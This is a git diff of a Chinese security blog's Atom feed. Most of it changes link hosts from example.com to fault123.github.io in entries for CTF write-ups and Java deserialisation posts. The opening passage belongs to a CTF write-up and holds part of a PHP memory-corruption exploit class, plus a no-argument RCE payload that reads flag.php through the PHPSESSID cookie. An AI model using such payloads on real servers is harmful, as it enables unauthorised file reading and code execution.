class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(LOGGING) &#123;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$size</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有绕过去的爹教教我<br>然后我尝试使用无参rce去读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在cookie的PHPSESSID中传/var/www/html/flag.php<br>这里能发现有flag.php是因为另一个站里我扫出来了flag.php，灵机一动读一手<br>因为是未授权所以完全不用管因为改了PHPSESSID从而掉出后台</p><p>然后到此我们就拿到了600pt的flag了</p><h2 id="总结"><a class="headerlink" href="#总结"></a>总结</h2><p>我不敢说我是努力的，因为我真的很菜，天赋也很差，但是我深知我每一天的刷题都会有用的嘞<br>嘻嘻<br>网鼎杯到此就结束辣，没有进决赛，但是我们在贵阳玩的很开心<br>fault也没有对自己失望<br>那就到这里吧，我们强网杯见！</p>]]></content>
     
@@ -38,16 +38,16 @@
     
     
     
-    <category term="比赛wp" scheme="http://example.com/tags/%E6%AF%94%E8%B5%9Bwp/"/>
+    <category term="比赛wp" scheme="http://fault123.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
     
-    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <category term="渗透测试" scheme="http://fault123.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
   <entry>
     <title>4T$CTF-赛后复现</title>
-    <link href="http://example.com/2024/11/13/4T$CTF-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://example.com/2024/11/13/4T$CTF-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
+    <link href="http://fault123.github.io/2024/11/13/4T$CTF-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://fault123.github.io/2024/11/13/4T$CTF-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
     <published>2024-11-12T16:00:00.000Z</published>
     <updated>2024-11-13T04:20:37.074Z</updated>
     
@@ -65,14 +65,14 @@
     
     
     
-    <category term="比赛wp" scheme="http://example.com/tags/%E6%AF%94%E8%B5%9Bwp/"/>
+    <category term="比赛wp" scheme="http://fault123.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
     
   </entry>
   
   <entry>
     <title>春秋云境-spoofing</title>
-    <link href="http://example.com/2024/11/08/spoofing/"/>
-    <id>http://example.com/2024/11/08/spoofing/</id>
+    <link href="http://fault123.github.io/2024/11/08/spoofing/"/>
+    <id>http://fault123.github.io/2024/11/08/spoofing/</id>
     <published>2024-11-07T16:00:00.000Z</published>
     <updated>2024-11-08T12:55:10.651Z</updated>
     
@@ -90,18 +90,18 @@
     
     
     
-    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <category term="渗透测试" scheme="http://fault123.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
-    <category term="春秋云境" scheme="http://example.com/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
+    <category term="域相关" scheme="http://fault123.github.io/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
     
-    <category term="域相关" scheme="http://example.com/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
+    <category term="春秋云境" scheme="http://fault123.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
     
   </entry>
   
   <entry>
     <title>FastJson-1.2.24版本漏洞分析</title>
-    <link href="http://example.com/2024/10/16/FastJson-1.2.24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://example.com/2024/10/16/FastJson-1.2.24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
+    <link href="http://fault123.github.io/2024/10/16/FastJson-1.2.24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://fault123.github.io/2024/10/16/FastJson-1.2.24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
     <published>2024-10-15T16:00:00.000Z</published>
     <updated>2024-10-17T11:41:38.668Z</updated>
     
@@ -117,14 +117,14 @@
     
     
     
-    <category term="Java" scheme="http://example.com/tags/Java/"/>
+    <category term="Java" scheme="http://fault123.github.io/tags/Java/"/>
     
   </entry>
   
   <entry>
     <title>春秋云境-Tsclient</title>
-    <link href="http://example.com/2024/09/16/Tsclient/"/>
-    <id>http://example.com/2024/09/16/Tsclient/</id>
+    <link href="http://fault123.github.io/2024/09/16/Tsclient/"/>
+    <id>http://fault123.github.io/2024/09/16/Tsclient/</id>
     <published>2024-09-15T16:00:00.000Z</published>
     <updated>2024-09-17T10:39:42.865Z</updated>
     
@@ -140,20 +140,20 @@
     
     
     
-    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <category term="渗透测试" scheme="http://fault123.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
-    <category term="Web" scheme="http://example.com/tags/Web/"/>
+    <category term="Web" scheme="http://fault123.github.io/tags/Web/"/>
     
-    <category term="春秋云境" scheme="http://example.com/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
+    <category term="域相关" scheme="http://fault123.github.io/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
     
-    <category term="域相关" scheme="http://example.com/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
+    <category term="春秋云境" scheme="http://fault123.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
     
   </entry>
   
   <entry>
     <title>CCS巅峰极客wp --by 图书馆五楼风很大</title>
-    <link href="http://example.com/2024/08/18/CCS%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp%20--by%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%BA%94%E6%A5%BC%E9%A3%8E%E5%BE%88%E5%A4%A7/"/>
-    <id>http://example.com/2024/08/18/CCS%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp%20--by%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%BA%94%E6%A5%BC%E9%A3%8E%E5%BE%88%E5%A4%A7/</id>
+    <link href="http://fault123.github.io/2024/08/18/CCS%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp%20--by%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%BA%94%E6%A5%BC%E9%A3%8E%E5%BE%88%E5%A4%A7/"/>
+    <id>http://fault123.github.io/2024/08/18/CCS%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2wp%20--by%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%BA%94%E6%A5%BC%E9%A3%8E%E5%BE%88%E5%A4%A7/</id>
     <published>2024-08-17T16:00:00.000Z</published>
     <updated>2024-08-18T13:48:34.839Z</updated>
     
@@ -170,14 +170,14 @@
     
     
     
-    <category term="比赛wp" scheme="http://example.com/tags/%E6%AF%94%E8%B5%9Bwp/"/>
+    <category term="比赛wp" scheme="http://fault123.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
     
   </entry>
   
   <entry>
     <title>春秋云境-Initial</title>
-    <link href="http://example.com/2024/08/06/Initial/"/>
-    <id>http://example.com/2024/08/06/Initial/</id>
+    <link href="http://fault123.github.io/2024/08/06/Initial/"/>
+    <id>http://fault123.github.io/2024/08/06/Initial/</id>
     <published>2024-08-05T16:00:00.000Z</published>
     <updated>2024-09-17T10:30:27.981Z</updated>
     
@@ -194,16 +194,16 @@
     
     
     
-    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <category term="渗透测试" scheme="http://fault123.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
-    <category term="春秋云境" scheme="http://example.com/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
+    <category term="春秋云境" scheme="http://fault123.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
     
   </entry>
   
   <entry>
     <title>关于信息泄露的一些吐槽</title>
-    <link href="http://example.com/2024/08/04/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%90%E6%A7%BD/"/>
-    <id>http://example.com/2024/08/04/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%90%E6%A7%BD/</id>
+    <link href="http://fault123.github.io/2024/08/04/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%90%E6%A7%BD/"/>
+    <id>http://fault123.github.io/2024/08/04/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%90%90%E6%A7%BD/</id>
     <published>2024-08-03T16:00:00.000Z</published>
     <updated>2024-08-05T14:35:15.394Z</updated>
     
@@ -219,14 +219,14 @@
     
     
     
-    <category term="日常" scheme="http://example.com/tags/%E6%97%A5%E5%B8%B8/"/>
+    <category term="日常" scheme="http://fault123.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
     
   </entry>
   
   <entry>
     <title>工坊wp-RSA2</title>
-    <link href="http://example.com/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/"/>
-    <id>http://example.com/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/</id>
+    <link href="http://fault123.github.io/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/"/>
+    <id>http://fault123.github.io/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/</id>
     <published>2024-07-27T16:00:00.000Z</published>
     <updated>2024-08-06T03:11:48.735Z</updated>
     
@@ -243,14 +243,14 @@
     
     
     
-    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
+    <category term="Crypto" scheme="http://fault123.github.io/tags/Crypto/"/>
     
   </entry>
   
   <entry>
     <title>工坊wp-RSA1</title>
-    <link href="http://example.com/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/"/>
-    <id>http://example.com/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/</id>
+    <link href="http://fault123.github.io/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/"/>
+    <id>http://fault123.github.io/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/</id>
     <published>2024-07-25T16:00:00.000Z</published>
     <updated>2024-08-06T03:11:46.388Z</updated>
     
@@ -266,14 +266,14 @@
     
     
     
-    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
+    <category term="Crypto" scheme="http://fault123.github.io/tags/Crypto/"/>
     
   </entry>
   
   <entry>
     <title>DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘</title>
-    <link href="http://example.com/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic&#39;s%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/"/>
-    <id>http://example.com/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic&#39;s%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/</id>
+    <link href="http://fault123.github.io/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic&#39;s%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/"/>
+    <id>http://fault123.github.io/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic&#39;s%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/</id>
     <published>2024-07-22T16:00:00.000Z</published>
     <updated>2024-07-29T14:47:25.189Z</updated>
     
@@ -290,16 +290,16 @@
     
     
     
-    <category term="比赛wp" scheme="http://example.com/tags/%E6%AF%94%E8%B5%9Bwp/"/>
+    <category term="比赛wp" scheme="http://fault123.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
     
-    <category term="Web" scheme="http://example.com/tags/Web/"/>
+    <category term="Web" scheme="http://fault123.github.io/tags/Web/"/>
     
   </entry>
   
   <entry>
     <title>NTLM认证学习</title>
-    <link href="http://example.com/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://example.com/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/</id>
+    <link href="http://fault123.github.io/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://fault123.github.io/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/</id>
     <published>2024-03-21T05:11:21.573Z</published>
     <updated>2024-08-08T09:07:54.904Z</updated>
     
@@ -315,14 +315,14 @@
     
     
     
-    <category term="域相关" scheme="http://example.com/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
+    <category term="域相关" scheme="http://fault123.github.io/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
     
   </entry>
   
   <entry>
     <title>kerberos协议学习</title>
-    <link href="http://example.com/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://example.com/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
+    <link href="http://fault123.github.io/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://fault123.github.io/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
     <published>2024-03-21T05:11:21.572Z</published>
     <updated>2024-07-29T13:44:19.852Z</updated>
     
@@ -338,14 +338,14 @@
     
     
     
-    <category term="域相关" scheme="http://example.com/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
+    <category term="域相关" scheme="http://fault123.github.io/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/"/>
     
   </entry>
   
   <entry>
     <title>2023年终总结</title>
-    <link href="http://example.com/2024/03/21/2023/"/>
-    <id>http://example.com/2024/03/21/2023/</id>
+    <link href="http://fault123.github.io/2024/03/21/2023/"/>
+    <id>http://fault123.github.io/2024/03/21/2023/</id>
     <published>2024-03-21T05:09:03.121Z</published>
     <updated>2024-07-29T12:53:06.976Z</updated>
     
@@ -362,14 +362,14 @@
     
     
     
-    <category term="总结" scheme="http://example.com/tags/%E6%80%BB%E7%BB%93/"/>
+    <category term="总结" scheme="http://fault123.github.io/tags/%E6%80%BB%E7%BB%93/"/>
     
   </entry>
   
   <entry>
     <title>NSSCTF IOT题目复现</title>
-    <link href="http://example.com/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://example.com/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
+    <link href="http://fault123.github.io/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://fault123.github.io/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
     <published>2024-03-21T05:07:56.783Z</published>
     <updated>2024-07-29T13:41:50.916Z</updated>
     
@@ -385,14 +385,14 @@
     
     
     
-    <category term="IOT" scheme="http://example.com/tags/IOT/"/>
+    <category term="IOT" scheme="http://fault123.github.io/tags/IOT/"/>
     
   </entry>
   
   <entry>
     <title>commonscollections-1</title>
-    <link href="http://example.com/2024/03/21/commonscollections-1/"/>
-    <id>http://example.com/2024/03/21/commonscollections-1/</id>
+    <link href="http://fault123.github.io/2024/03/21/commonscollections-1/"/>
+    <id>http://fault123.github.io/2024/03/21/commonscollections-1/</id>
     <published>2024-03-21T05:06:50.647Z</published>
     <updated>2024-07-29T13:45:14.943Z</updated>
     
@@ -410,14 +410,14 @@
     
     
     
-    <category term="Java" scheme="http://example.com/tags/Java/"/>
+    <category term="Java" scheme="http://fault123.github.io/tags/Java/"/>
     
   </entry>
   
   <entry>
     <title>commons-collections 6</title>
-    <link href="http://example.com/2024/03/21/commons-collections%206/"/>
-    <id>http://example.com/2024/03/21/commons-collections%206/</id>
+    <link href="http://fault123.github.io/2024/03/21/commons-collections%206/"/>
+    <id>http://fault123.github.io/2024/03/21/commons-collections%206/</id>
     <published>2024-03-21T05:06:50.644Z</published>
     <updated>2024-07-29T13:45:38.999Z</updated>
     
@@ -433,14 +433,14 @@
     
     
     
-    <category term="Java" scheme="http://example.com/tags/Java/"/>
+    <category term="Java" scheme="http://fault123.github.io/tags/Java/"/>
     
   </entry>
   
   <entry>
     <title>commons-collections 4</title>
-    <link href="http://example.com/2024/03/21/commons-collections%204/"/>
-    <id>http://example.com/2024/03/21/commons-collections%204/</id>
+    <link href="http://fault123.github.io/2024/03/21/commons-collections%204/"/>
+    <id>http://fault123.github.io/2024/03/21/commons-collections%204/</id>
     <published>2024-03-21T05:06:50.642Z</published>
     <updated>2024-07-29T13:45:49.401Z</updated>
     
@@ -458,14 +458,14 @@ PriorityQueue.readObjet-&amp;gt;TransformingComparator.compare-&amp;gt;CC3.Insta
     
     
     
-    <category term="Java" scheme="http://example.com/tags/Java/"/>
+    <category term="Java" scheme="http://fault123.github.io/tags/Java/"/>
     
   </entry>
   
   <entry>
     <title>commons-collections 2</title>
-    <link href="http://example.com/2024/03/21/commons-collections%202/"/>
-    <id>http://example.com/2024/03/21/commons-collections%202/</id>
+    <link href="http://fault123.github.io/2024/03/21/commons-collections%202/"/>
+    <id>http://fault123.github.io/2024/03/21/commons-collections%202/</id>
     <published>2024-03-21T05:06:50.641Z</published>
     <updated>2024-07-29T13:45:56.216Z</updated>
     
@@ -482,14 +482,14 @@ CC2它其实是没有走TrAXFilter的这里&lt;br&gt;
     
     
     
-    <category term="Java" scheme="http://example.com/tags/Java/"/>
+    <category term="Java" scheme="http://fault123.github.io/tags/Java/"/>
     
   </entry>
   
   <entry>
     <title>commons-collection 3</title>
-    <link href="http://example.com/2024/03/21/commons-collection%203/"/>
-    <id>http://example.com/2024/03/21/commons-collection%203/</id>
+    <link href="http://fault123.github.io/2024/03/21/commons-collection%203/"/>
+    <id>http://fault123.github.io/2024/03/21/commons-collection%203/</id>
     <published>2024-03-21T05:06:50.639Z</published>
     <updated>2024-07-29T13:46:03.347Z</updated>
     
@@ -505,7 +505,7 @@ CC2它其实是没有走TrAXFilter的这里&lt;br&gt;
     
     
     
-    <category term="Java" scheme="http://example.com/tags/Java/"/>
+    <category term="Java" scheme="http://fault123.github.io/tags/Java/"/>
     
   </entry>
   
